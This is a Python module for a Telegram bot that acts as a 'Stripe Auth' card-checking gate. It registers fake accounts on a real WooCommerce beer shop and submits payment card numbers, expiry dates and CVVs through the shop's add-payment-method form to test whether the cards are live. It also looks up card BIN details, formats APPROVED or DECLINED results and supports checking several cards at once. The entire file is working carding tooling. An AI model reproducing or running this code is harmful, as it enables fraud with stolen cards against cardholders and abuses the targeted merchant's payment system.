# gates/stauth.py - BlackDonkey Stripe Auth implementation

import asyncio
import json
import re
import time
import httpx
import random
import string
from datetime import datetime
from telethon import events, Button
from shared import (
    PLANS, get_user_plan, is_user_banned,
    get_user_session, increment_gate_usage,
    can_user_use_command, update_user_cooldown,
    get_gate_usage_count
)

class StripeAuthChecker:
    def __init__(self, session):
        self.session = session
        self.user_agent = self.generate_user_agent()
        self.bin_cache = {}
        self.last_bin_request = 0
        self.request_timeout = 30.0
        self.bin_services = [
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            },
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bin-checker.net/api/{bin}',
                'headers': {'User-Agent': self.user_agent, 'Accept': 'application/json'},
                'name': 'bin-checker.net',
                'parser': self.parse_bin_checker
            }
        ]

        # Country code to name mapping
        self.country_map = {
            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa',
            'TR': 'Turkey', 'SA': 'Saudi Arabia', 'TH': 'Thailand', 'MY': 'Malaysia',
            'ID': 'Indonesia', 'PH': 'Philippines', 'VN': 'Vietnam', 'IL': 'Israel',
            'EG': 'Egypt', 'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru',
            'VE': 'Venezuela', 'GR': 'Greece', 'PL': 'Poland', 'CZ': 'Czech Republic',
            'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria', 'UA': 'Ukraine',
            'SK': 'Slovakia', 'SI': 'Slovenia', 'HR': 'Croatia', 'RS': 'Serbia',
            'EE': 'Estonia', 'LV': 'Latvia', 'LT': 'Lithuania', 'IS': 'Iceland',
            'LU': 'Luxembourg', 'CY': 'Cyprus', 'MT': 'Malta', 'MC': 'Monaco',
            'AD': 'Andorra', 'SM': 'San Marino', 'VA': 'Vatican City', 'LI': 'Liechtenstein',
            'JE': 'Jersey', 'GG': 'Guernsey', 'IM': 'Isle of Man', 'FO': 'Faroe Islands',
            'GL': 'Greenland', 'GI': 'Gibraltar', 'BM': 'Bermuda', 'KY': 'Cayman Islands',
            'VG': 'British Virgin Islands', 'TC': 'Turks and Caicos Islands', 'MS': 'Montserrat',
            'AI': 'Anguilla', 'AG': 'Antigua and Barbuda', 'BS': 'Bahamas', 'BB': 'Barbados',
            'BZ': 'Belize', 'CR': 'Costa Rica', 'DM': 'Dominica', 'DO': 'Dominican Republic',
            'SV': 'El Salvador', 'GD': 'Grenada', 'GT': 'Guatemala', 'HT': 'Haiti',
            'HN': 'Honduras', 'JM': 'Jamaica', 'NI': 'Nicaragua', 'PA': 'Panama',
            'KN': 'Saint Kitts and Nevis', 'LC': 'Saint Lucia', 'VC': 'Saint Vincent and the Grenadines',
            'TT': 'Trinidad and Tobago', 'UY': 'Uruguay', 'PY': 'Paraguay', 'BO': 'Bolivia',
            'EC': 'Ecuador', 'GY': 'Guyana', 'SR': 'Suriname', 'GF': 'French Guiana',
            'MQ': 'Martinique', 'GP': 'Guadeloupe', 'RE': 'Réunion', 'YT': 'Mayotte',
            'PM': 'Saint Pierre and Miquelon', 'WF': 'Wallis and Futuna', 'PF': 'French Polynesia',
            'NC': 'New Caledonia', 'TK': 'Tokelau', 'CK': 'Cook Islands', 'NU': 'Niue',
            'WS': 'Samoa', 'TO': 'Tonga', 'FJ': 'Fiji', 'VU': 'Vanuatu', 'SB': 'Solomon Islands',
            'KI': 'Kiribati', 'TV': 'Tuvalu', 'FM': 'Micronesia', 'MH': 'Marshall Islands',
            'PW': 'Palau', 'NR': 'Nauru', 'PG': 'Papua New Guinea', 'MP': 'Northern Mariana Islands',
            'GU': 'Guam', 'AS': 'American Samoa', 'PR': 'Puerto Rico', 'VI': 'U.S. Virgin Islands',
            'UM': 'U.S. Minor Outlying Islands', 'AW': 'Aruba', 'CW': 'Curaçao', 'SX': 'Sint Maarten',
            'BQ': 'Caribbean Netherlands', 'BL': 'Saint Barthélemy', 'MF': 'Saint Martin',
            'KM': 'Comoros', 'DJ': 'Djibouti', 'ER': 'Eritrea', 'ET': 'Ethiopia',
            'KE': 'Kenya', 'MG': 'Madagascar', 'MW': 'Malawi', 'MU': 'Mauritius',
            'YT': 'Mayotte', 'MZ': 'Mozambique', 'RW': 'Rwanda', 'SC': 'Seychelles',
            'SO': 'Somalia', 'TZ': 'Tanzania', 'UG': 'Uganda', 'ZM': 'Zambia',
            'ZW': 'Zimbabwe', 'AO': 'Angola', 'CM': 'Cameroon', 'CF': 'Central African Republic',
            'TD': 'Chad', 'CG': 'Republic of the Congo', 'CD': 'Democratic Republic of the Congo',
            'GQ': 'Equatorial Guinea', 'GA': 'Gabon', 'ST': 'São Tomé and Príncipe',
            'BW': 'Botswana', 'LS': 'Lesotho', 'NA': 'Namibia', 'SZ': 'Eswatini',
            'LY': 'Libya', 'MA': 'Morocco', 'DZ': 'Algeria', 'TN': 'Tunisia',
            'MR': 'Mauritania', 'SN': 'Senegal', 'GM': 'Gambia', 'GN': 'Guinea',
            'GW': 'Guinea-Bissau', 'LR': 'Liberia', 'SL': 'Sierra Leone', 'CI': 'Ivory Coast',
            'BF': 'Burkina Faso', 'BJ': 'Benin', 'NG': 'Nigeria', 'TG': 'Togo',
            'GH': 'Ghana', 'ML': 'Mali', 'NE': 'Niger', 'CV': 'Cape Verde',
            'SD': 'Sudan', 'SS': 'South Sudan', 'DJ': 'Djibouti', 'ER': 'Eritrea',
            'IQ': 'Iraq', 'IR': 'Iran', 'JO': 'Jordan', 'KW': 'Kuwait', 'LB': 'Lebanon',
            'OM': 'Oman', 'QA': 'Qatar', 'SY': 'Syria', 'YE': 'Yemen', 'BH': 'Bahrain',
            'PS': 'Palestine', 'AF': 'Afghanistan', 'BD': 'Bangladesh', 'BT': 'Bhutan',
            'MM': 'Myanmar', 'KH': 'Cambodia', 'LA': 'Laos', 'MN': 'Mongolia',
            'NP': 'Nepal', 'PK': 'Pakistan', 'LK': 'Sri Lanka', 'MV': 'Maldives',
            'KG': 'Kyrgyzstan', 'KZ': 'Kazakhstan', 'TJ': 'Tajikistan', 'TM': 'Turkmenistan',
            'UZ': 'Uzbekistan', 'AM': 'Armenia', 'AZ': 'Azerbaijan', 'GE': 'Georgia',
            'MD': 'Moldova', 'BY': 'Belarus', 'AL': 'Albania', 'BA': 'Bosnia and Herzegovina',
            'MK': 'North Macedonia', 'ME': 'Montenegro', 'XK': 'Kosovo'
        }

    def generate_user_agent(self):
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
        ]
        return random.choice(browsers)

    def parse_binlist_net(self, data):
        country_code = data.get('country', {}).get('alpha2', 'N/A')
        country_name = self.country_map.get(country_code, data.get('country', {}).get('name', 'N/A'))

        return {
            'scheme': data.get('scheme', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A'),
            'bank': data.get('bank', {}).get('name', 'N/A'),
            'country': country_name,
            'country_code': country_code
        }

    def parse_bin_checker(self, data):
        country_code = data.get('country', {}).get('alpha2', data.get('country_code', 'N/A'))
        country_name = self.country_map.get(country_code, data.get('country', {}).get('name', data.get('country_name', 'N/A')))

        return {
            'scheme': data.get('scheme', data.get('card_type', 'N/A')).upper(),
            'type': data.get('type', data.get('card_level', 'N/A')).upper(),
            'brand': data.get('brand', data.get('card_brand', 'N/A')),
            'bank': data.get('bank', {}).get('name', data.get('issuer', 'N/A')),
            'country': country_name,
            'country_code': country_code
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A'
                }

        country_code = data.get('country', 'N/A')
        country_name = self.country_map.get(country_code, 'N/A')

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A'),
            'bank': data.get('bank', 'N/A'),
            'country': country_name,
            'country_code': country_code
        }

    async def get_bin_info(self, cc):
        bin_number = cc[:6] if cc else '000000'
        bin_number = ''.join(c for c in bin_number if c.isdigit())
        bin_number = bin_number.ljust(6, '0')[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 2.0:
            await asyncio.sleep(2.0 - (now - self.last_bin_request))
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=self.request_timeout) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        try:
                            data = response.json()
                        except json.JSONDecodeError:
                            if service['name'] == 'antipublic.cc':
                                data = response.text
                            else:
                                raise

                        result = service['parser'](data)
                        self.bin_cache[bin_number] = result
                        return result
                    elif response.status_code == 429:
                        continue
            except Exception:
                continue

        self.bin_cache[bin_number] = default_response
        return default_response

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time):
        bin_info = await self.get_bin_info(cc)
        emoji = "✅" if "APPROVED" in status else "❌"

        return (
            "╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
            f"│ ⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
            "├──────────◆───────────┤\n"
            f"│  𝑺𝒕𝒂𝒕𝒖𝒔: {status} {emoji}\n"
            f"│  𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
            f"│  𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
            "├──────────◆───────────┤\n"
            f"│  𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
            f"│  𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
            f"│  𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
            f"│  𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
            "├──────────◆───────────┤\n"
            f"│  𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
            f"│  𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
            "╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
        )

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return (
            "➺➺➺  𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱   ➺➺➺\n"
            f"𝑺𝒕𝒂𝒕𝒖𝒔 → 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 𝑪𝑪.....\n"
            f"𝑮𝑨𝑻𝑬 →  𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
            f"𝑪𝑪 →  `{cc}|{mes}|{ano}|{cvv}`\n"
            "✦─✧─✦─✧─✦─✧─✦\n"
            f"𝑼𝒔𝒆𝒓 𝑷𝒍𝒂𝒏 →  {user_plan}\n"
            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 →  @{username}\n"
        )

    async def format_mass_response(self, cc, mes, ano, cvv, status, message, bin_info):
        status_emoji = "✅" if "APPROVED" in status else "❌"
        return (
            f"Card :  {cc}|{mes}|{ano}|{cvv}\n"
            f"Status : {status} {status_emoji}\n"
            f"Response : {message}\n"
            f"Info :  {bin_info['scheme']} - {bin_info['brand']} - {bin_info['type']}\n"
            f"Issuer :  {bin_info['bank']}\n"
            f"Country :  {bin_info['country']}({bin_info['country_code']})\n"
        )

    def get_country_zip_code(self, country_code):
        """Get appropriate zip code based on country"""
        zip_codes = {
            'US': '10001',  # New York
            'GB': 'SW1A 1AA',  # London
            'CA': 'M5V 2T6',  # Toronto
            'AU': '2000',  # Sydney
            'DE': '10115',  # Berlin
            'FR': '75001',  # Paris
            'IT': '00100',  # Rome
            'ES': '28001',  # Madrid
            'NL': '1012 JS',  # Amsterdam
            'JP': '100-0001',  # Tokyo
            'SG': '018906',  # Singapore
            'AE': '00000',  # Dubai
            'IN': '110001',  # New Delhi
            'BR': '20040-000',  # Rio de Janeiro
            'MX': '06000',  # Mexico City
            'TW': '100',  # Taipei
        }
        return zip_codes.get(country_code.upper(), '10001')  # Default to US zip

    async def check_card(self, card_details, username, user_plan):
        start_time = time.time()

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid format", username, time.time()-start_time)

            cc = cc_parts[0].strip()
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if len(ano) == 2:
                ano = '20' + ano

            # Get bin info to determine country for appropriate zip code
            bin_info = await self.get_bin_info(cc)
            country_code = bin_info.get('country_code', 'US')
            zip_code = self.get_country_zip_code(country_code)

            username_tg = f"{username}_{random.randint(1000, 9999)}"
            email = f"{username_tg}@wywnxa.com"
            password = f"{username_tg}@pass123"

            async with httpx.AsyncClient(follow_redirects=True, timeout=self.request_timeout, headers={
                "User-Agent": self.user_agent,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://blackdonkeybeer.com",
                "Referer": "https://blackdonkeybeer.com/my-account/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Upgrade-Insecure-Requests": "1"
            }) as client:
                # Get registration page to extract nonce
                try:
                    reg_page = await client.get("https://blackdonkeybeer.com/my-account/", timeout=15.0)
                    nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', reg_page.text)
                    if not nonce_match:
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot get nonce", username, time.time()-start_time)
                except (httpx.TimeoutException, httpx.ConnectError):
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection timeout", username, time.time()-start_time)

                # Register a new account
                reg_data = {
                    "email": email,
                    "password": password,
                    "mailchimp_woocommerce_gdpr[cedcdfe02a]": "0",
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "(none)",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": "https://blackdonkeybeer.com/my-account/",
                    "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "wc_order_attribution_session_pages": "12",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": self.user_agent,
                    "woocommerce-register-nonce": nonce_match.group(1),
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }

                try:
                    reg_res = await client.post(
                        "https://blackdonkeybeer.com/my-account/",
                        data=reg_data,
                        timeout=20.0
                    )
                except (httpx.TimeoutException, httpx.ConnectError):
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Registration timeout", username, time.time()-start_time)

                # Check if registration was successful by checking the response URL and content
                reg_res_url = str(reg_res.url)
                reg_res_text = reg_res.text.lower()
                
                # More comprehensive registration success checks
                registration_success = (
                    "dashboard" in reg_res_text or 
                    "my-account" in reg_res_url or
                    "logout" in reg_res_text or
                    "account details" in reg_res_text or
                    "hello" in reg_res_text
                )
                
                if not registration_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot create account", username, time.time()-start_time)

                # Get payment method page to extract Stripe elements
                try:
                    payment_page = await client.get("https://blackdonkeybeer.com/my-account/add-payment-method/", timeout=15.0)
                except (httpx.TimeoutException, httpx.ConnectError):
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Payment page timeout", username, time.time()-start_time)

                # Extract the form nonce
                form_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_page.text)
                if not form_nonce_match:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Cannot get payment form nonce", username, time.time()-start_time)

                form_nonce = form_nonce_match.group(1)

                # Extract the form action URL
                form_action_match = re.search(r'<form[^>]+action="([^"]+)"[^>]*>', payment_page.text)
                form_action = form_action_match.group(1) if form_action_match else "https://blackdonkeybeer.com/my-account/add-payment-method/"

                # Submit the payment method form directly with appropriate country data
                payment_form_data = {
                    "payment_method": "stripe",
                    "wc-stripe-payment-token": "",
                    "stripe_card_number": cc,
                    "stripe_exp_month": mes,
                    "stripe_exp_year": ano,
                    "stripe_cvc": cvv,
                    "stripe_billing_postalcode": zip_code,
                    "stripe_billing_country": country_code,
                    "woocommerce-add-payment-method-nonce": form_nonce,
                    "_wp_http_referer": "/my-account/add-payment-method/",
                    "woocommerce_add_payment_method": "1"
                }

                try:
                    payment_res = await client.post(
                        form_action,
                        data=payment_form_data,
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Referer": "https://blackdonkeybeer.com/my-account/add-payment-method/",
                            "Origin": "https://blackdonkeybeer.com"
                        },
                        timeout=25.0
                    )
                except (httpx.TimeoutException, httpx.ConnectError):
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Payment timeout", username, time.time()-start_time)

                # Check if the payment method was added successfully - IMPROVED DETECTION
                payment_res_url = str(payment_res.url)
                payment_res_text = payment_res.text.lower()

                # Comprehensive success detection
                success_indicators = [
                    "payment method successfully added",
                    "payment-methods",
                    "payment method has been added",
                    "card added successfully",
                    "payment method saved",
                    "method added successfully"
                ]

                # Comprehensive failure detection
                failure_indicators = [
                    "declined",
                    "invalid",
                    "error",
                    "failed",
                    "cannot be processed",
                    "try again",
                    "unsuccessful",
                    "card was declined",
                    "card number is incorrect",
                    "security code is invalid",
                    "expiration date is invalid"
                ]

                success_detected = any(indicator in payment_res_text for indicator in success_indicators)
                failure_detected = any(indicator in payment_res_text for indicator in failure_indicators)

                if success_detected:
                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
                elif failure_detected:
                    # Try to extract specific error message
                    error_match = re.search(r'<div[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</div>', payment_res.text, re.IGNORECASE | re.DOTALL)
                    if error_match:
                        error_message = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time)
                    else:
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Card declined by issuer", username, time.time()-start_time)
                else:
                    # If we can't clearly determine, check URL pattern
                    if "payment-methods" in payment_res_url:
                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
                    else:
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Unable to add payment method", username, time.time()-start_time)

        except httpx.ConnectError:
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection error", username, time.time()-start_time)
        except httpx.TimeoutException:
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Timeout error", username, time.time()-start_time)
        except Exception as e:
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)}", username, time.time()-start_time)

    def format_result(self, result, username, user_plan):
        return result

async def handle_stripe_auth(event):
    user_id = event.sender_id
    if is_user_banned(user_id):
        await event.respond("⛔ You have been banned from using this bot.")
        return

    args = event.message.text.split()
    if len(args) < 2:
        await event.respond("❗Please provide card details in format: `/au cc|mm|yy|cvv`")
        return

    card_details = args[1]
    username = event.sender.username or str(user_id)
    user_plan = get_user_plan(user_id)

    can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
    if not can_use:
        await event.respond(reason)
        return

    session = get_user_session(user_id)
    checker = StripeAuthChecker(session)

    cc_parts = card_details.split('|')
    if len(cc_parts) < 4:
        await event.respond("❌ Invalid card format. Use: `/au cc|mm|yy|cvv`")
        return

    cc = cc_parts[0]
    mes = cc_parts[1]
    ano = cc_parts[2]
    cvv = cc_parts[3]

    processing_msg = await event.respond(
        checker.get_processing_message(cc, mes, ano, cvv, username, user_plan))

    result = await checker.check_card(card_details, username, user_plan)

    increment_gate_usage(user_id)
    update_user_cooldown(user_id)

    await processing_msg.edit(result)

async def handle_mass_stripe_auth(event):
    user_id = event.sender_id
    if is_user_banned(user_id):
        await event.respond("⛔ You have been banned from using this bot.")
        return

    args = event.message.text.split('\n')
    if len(args) < 2:
        await event.respond("❗Please provide card details in format (max 5 cards):\n"
                           "`/mau`\n"
                           "`cc|mm|yy|cvv`\n"
                           "`cc|mm|yy|cvv`\n"
                           "...")
        return

    username = event.sender.username or str(user_id)
    user_plan = get_user_plan(user_id)

    can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
    if not can_use:
        await event.respond(reason)
        return

    session = get_user_session(user_id)
    checker = StripeAuthChecker(session)

    card_list = [card.strip() for card in args[1:] if card.strip()]

    if len(card_list) > 5:
        await event.respond("❌ Maximum 5 cards allowed per request.")
        return

    processing_msg = await event.respond("Processing....")

    results = []
    for card_details in card_list:
        card_details = card_details.strip()
        if not card_details:
            continue

        cc_parts = card_details.split('|')
        if len(cc_parts) != 4:
            results.append("❌ Invalid format: Use CC|MM|YY|CVV")
            continue

        cc, mes, ano, cvv = cc_parts
        cc = cc.strip()
        mes = mes.strip()
        ano = ano.strip()
        cvv = cvv.strip()

        result = await checker.check_card(card_details, username, user_plan)
        results.append(result)

        increment_gate_usage(user_id)
        update_user_cooldown(user_id)

        await asyncio.sleep(random.uniform(2, 3))

    response = "🔐 **Stripe Auth [ /mau ]**\n"
    response += "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
    for i, result in enumerate(results):
        response += f"**Card {i + 1}:**\n{result}\n"
        if i < len(results) - 1:
            response += "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"

    response += "˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    await processing_msg.edit(response)
